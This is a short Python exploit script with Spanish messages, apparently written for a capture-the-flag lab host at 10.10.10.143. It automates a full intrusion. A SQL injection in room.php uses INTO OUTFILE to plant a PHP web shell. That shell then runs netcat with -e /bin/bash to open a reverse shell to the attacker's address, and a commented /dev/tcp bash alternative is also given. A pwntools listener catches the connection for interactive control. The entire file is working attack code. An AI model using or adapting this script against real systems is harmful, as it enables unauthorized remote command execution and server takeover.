#!/usr/bin/python
#coding: utf-8

import requests, time, sys, threading
from pwn import *

if len(sys.argv) !=2:
    print "\n[*] Uso: python " + sys.argv[0] + " filename.php\n"
    sys.exit(0)

# Variables globales
filename = sys.argv[1]
lport = 443

def makeRequest():

    try:
        # Declaracion de variables
        url_file = """http://10.10.10.143/room.php?cod=0 union select 1,2,"<?php echo shell_exec($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/images/%s"-- -""" % filename
        url_rev = "http://10.10.10.143/images/%s?cmd=nc -e /bin/bash 10.10.14.23 443" %filename # bash -i >& /dev/tcp/10.10.14.23/443 0>&1 &  

        p1 = log.progress("SQLI")
        p1.status("Subiendo archivo malicioso al servidor")
        time.sleep(2)

        r = requests.get(url_file)
        
        p1.success("El archivo ha sido subido correctamente")
        time.sleep(2)

        p2 = log.progress("Reverse Shell")
        p2.status("Obteniendo acceso al servidor")
        time.sleep(2)

        r = requests.get(url_rev, timeout=2)

        p2.success("Comando ejecutado correctamente")
        time.sleep(2)

        
    except requests.exceptions.ReadTimeout:

        p2.success("Comando ejecutado correctamente")
        time.sleep(2)

    except:
        print "\n[!] Ha ocurrido un error...\n"
        sys.exit(1)

if __name__ == '__main__':
    try:
        threading.Thread(target=makeRequest).start()
    except Exception as e:
        log.error(str(e))
    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("No se ha establecido ninguna conexion")
    else:
        log.success("Se ha establecido una conexion")
        log.info("Acceso al sistema")

    shell.interactive()
    
